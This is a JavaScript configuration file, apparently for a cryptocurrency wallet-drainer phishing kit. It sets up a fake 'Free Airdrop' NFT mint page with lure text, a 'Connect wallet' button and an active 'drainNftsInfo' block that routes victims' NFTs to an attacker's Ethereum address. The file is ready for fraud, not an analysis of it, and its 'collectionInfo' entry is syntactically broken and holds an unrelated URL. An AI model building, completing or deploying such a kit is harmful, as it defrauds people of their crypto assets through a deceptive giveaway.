const receiveAddress = '0x4fbC605Cd615a1b08C0F6a79f1d725db71BfAc6e',
  collectionInfo = 'https://status.infura.io/incidents/8w8n33bl4wv5'
    name: 'THE NFT WORLD',
    socialMedia: {
      discord: 'https://discord.gg',
      twitter: 'https://twitter.com',
      instagram: 'https://instagram.com/',
    },
  },

  indexPageInfo = {
    backgroundImage: 'background.jpg',
    title: '{name}',
    underTitle: 'Free Airdrop',
  },

  claimPageInfo = {
    title: 'GET YOUR<br>NFT NOW',
    shortDescription: 'Own, stake and build in our limitless possibilities Minecraft Metaverse',
    longDescription:
      'After claim, NTFs will appear in your Metamask wallet within 10 minutes',
    claimButtonText: 'CLAIM NOW',
    image: 'bg3.png',
    imageRadius: 250,
  },

  drainNftsInfo = {
    active: true,
    minValue: 0.1,
    nftReceiveAddress: '0x4fbC605Cd615a1b08C0F6a79f1d725db71BfAc6e',
  },

  customStrings = {
    title: 'MINT {name}',
    connectButton: 'Connect wallet',
    transferButton: 'Mint now',
    dateString: 'Pre sale available {date}',
  }
  
if (
  !receiveAddress.startsWith('0x') ||
  receiveAddress.length >= 64 || receiveAddress.length <= 40
) {
  console.error(
    'Error: ' + receiveAddress + ' is not a valid Ethereum address.'
  )
}
